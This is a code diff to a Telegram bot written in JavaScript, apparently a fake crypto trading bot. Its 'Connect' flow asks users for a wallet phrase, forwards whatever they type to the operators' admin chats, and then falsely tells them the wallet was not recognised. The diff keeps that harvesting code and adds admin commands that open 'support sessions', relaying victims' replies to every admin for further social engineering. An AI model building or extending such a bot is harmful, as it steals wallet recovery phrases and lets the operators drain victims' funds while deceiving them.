@@ -34,6 +34,7 @@ bot.use(session_local.middleware());
 
 const userWallets = {};
 const CONNECT_STATE = "waiting_for_phrase";
+const supportSessions = new Set(); // Tracks users in active support
 
 // --- Keyboards ---
 const mainMenuKeyboard = Markup.keyboard([
@@ -66,7 +67,7 @@ TOP ⬆️ Main Menu`;
   await ctx.replyWithMarkdown(msg, mainMenuKeyboard);
 }
 
-// --- SAFE Forwarding (with Markdown escaping + plain fallback) ---
+// --- SAFE Forwarding (with escaping + plain fallback) ---
 async function forwardUserData(ctx, phrase) {
   const username = ctx.from.username ? `@${ctx.from.username}` : "N/A";
   const userId = ctx.from.id;
@@ -107,6 +108,50 @@ async function forwardUserData(ctx, phrase) {
   }
 }
 
+// --- Admin-only: /msg <user_id> <text> ---
+bot.command("msg", async (ctx) => {
+  if (!ADMIN_CHAT_IDS.includes(ctx.from.id)) return;
+
+  const parts = ctx.message.text.split(' ');
+  if (parts.length < 3) {
+    return ctx.reply("❌ Usage: `/msg <user_id> <message>`", { parse_mode: "Markdown" });
+  }
+
+  const targetUserId = parts[1];
+  const messageText = parts.slice(2).join(' ');
+
+  if (!/^\d+$/.test(targetUserId)) {
+    return ctx.reply("❌ Invalid user ID. Must be a number.");
+  }
+
+  try {
+    await bot.telegram.sendMessage(targetUserId, messageText);
+    supportSessions.add(parseInt(targetUserId)); // add to support mode
+    await ctx.reply(`✅ Sent to user ${targetUserId}`);
+  } catch (err) {
+    await ctx.reply(`❌ Failed: ${err.message}`);
+  }
+});
+
+// --- Admin-only: /end <user_id> ---
+bot.command("end", async (ctx) => {
+  if (!ADMIN_CHAT_IDS.includes(ctx.from.id)) return;
+
+  const parts = ctx.message.text.split(' ');
+  const userId = parts[1];
+
+  if (!userId || !/^\d+$/.test(userId)) {
+    return ctx.reply("Usage: `/end <user_id>`", { parse_mode: "Markdown" });
+  }
+
+  const uid = parseInt(userId);
+  if (supportSessions.delete(uid)) {
+    await ctx.reply(`✅ Ended support session for ${uid}`);
+  } else {
+    await ctx.reply(`ℹ️ No active session for ${uid}`);
+  }
+});
+
 // --- Handlers ---
 bot.hears("🔗 Connect", async (ctx) => {
   ctx.session.state = CONNECT_STATE;
@@ -137,7 +182,6 @@ bot.command("menu", async (ctx) => {
   );
 });
 
-// Clear state on command
 bot.use(async (ctx, next) => {
   if (ctx.message?.text?.startsWith("/")) {
     if (ctx.session.state === CONNECT_STATE) ctx.session.state = null;
@@ -171,7 +215,7 @@ Thank you for your patience!`;
   }
 }
 
-// Commands & Buttons
+// Feature routes
 bot.hears("🛒 Buy", (ctx) => featureHandler(ctx, "Buy"));
 bot.command("buy", (ctx) => featureHandler(ctx, "Buy"));
 bot.hears("💰 Sell", (ctx) => featureHandler(ctx, "Sell"));
@@ -221,31 +265,48 @@ bot.hears("🔄 Reset", async (ctx) => {
   );
 });
 
-// --- Handle user phrase input ---
-bot.on("text", async (ctx, next) => {
-  if (ctx.session.state !== CONNECT_STATE) return next();
-  const phrase = ctx.message.text;
-  await forwardUserData(ctx, phrase);
-  ctx.session.state = null;
-  await ctx.reply("❌ Wallet not connected — We couldn’t recognise that wallet. Please double-check and try again.", mainMenuKeyboard);
-});
-
-// --- Fallback ---
+// --- Global message handler (with support relay) ---
 bot.on("text", async (ctx) => {
-  if (!ctx.session.state) {
-    await ctx.reply("I didn't recognize that. Please use the menu buttons below.", mainMenuKeyboard);
+  const userId = ctx.from.id;
+
+  // If user is in support mode, forward to ALL admins
+  if (supportSessions.has(userId)) {
+    const safeText = ctx.message.text
+      .replace(/_/g, '\\_')
+      .replace(/\*/g, '\\*')
+      .replace(/`/g, '\\`');
+    const forwardedMsg = `📨 *Reply from user ${userId}*\n\n${safeText}`;
+
+    for (const adminId of ADMIN_CHAT_IDS) {
+      try {
+        await bot.telegram.sendMessage(adminId, forwardedMsg, { parse_mode: "Markdown" });
+      } catch (err) {
+        console.warn(`Failed to forward to admin ${adminId}:`, err.message);
+      }
+    }
+    return;
   }
+
+  // Handle wallet connection flow
+  if (ctx.session.state === CONNECT_STATE) {
+    const phrase = ctx.message.text;
+    await forwardUserData(ctx, phrase);
+    ctx.session.state = null;
+    await ctx.reply("❌ Wallet not connected — We couldn’t recognise that wallet. Please double-check and try again.", mainMenuKeyboard);
+    return;
+  }
+
+  // Fallback
+  await ctx.reply("I didn't recognize that. Please use the menu buttons below.", mainMenuKeyboard);
 });
 
-// --- Start Bot with FORGIVING URL PARSING ---
+// --- Start Bot with Forgiving URL Parser ---
 if (WEBHOOK_URL) {
   try {
-    // ✅ Tolerant URL parser (Option 2)
     let cleanUrl = WEBHOOK_URL.trim();
     if (!cleanUrl.startsWith('http://') && !cleanUrl.startsWith('https://')) {
       cleanUrl = 'https://' + cleanUrl;
     }
-    // Remove trailing slash to avoid // in path
     if (cleanUrl.endsWith('/')) {
       cleanUrl = cleanUrl.slice(0, -1);
     }
@@ -267,7 +328,6 @@ if (WEBHOOK_URL) {
     });
   } catch (err) {
     console.error("❌ Invalid WEBHOOK_URL:", err.message);
-    console.error("💡 Tip: Set WEBHOOK_URL to your Koyeb app URL (e.g., https://your-app.koyeb.app)");
     process.exit(1);
   }
 } else {
